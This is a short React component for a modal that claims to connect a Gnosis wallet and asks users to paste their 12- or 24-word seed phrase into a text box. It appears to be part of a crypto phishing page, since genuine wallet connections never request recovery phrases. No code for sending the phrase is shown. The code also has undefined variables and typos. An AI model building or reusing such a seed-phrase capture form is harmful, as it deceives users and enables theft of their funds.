import React from 'react';

function modal2() {
  return (
    <div className={`bg_color ${classname}`}  onClick={setOpen} >
      <div  className="dinv">
        <p className='phr'>Phrase</p>
        <p className='para'>Establish a connection for yourGnosis WalletWallet</p>
        <form className='input'>
         <textarea name="message" rows="10" cols="30" placeholder='Wallet Phrase or Wallet Seed Words'></textarea>
       </form>
       <p className='para'>Typically 12 (sometimes 24) words separated by single spaces</p>
       <button className='btno'>Connet Wallet</button>
      </div>
    </div>
  );
}

export default modal2;
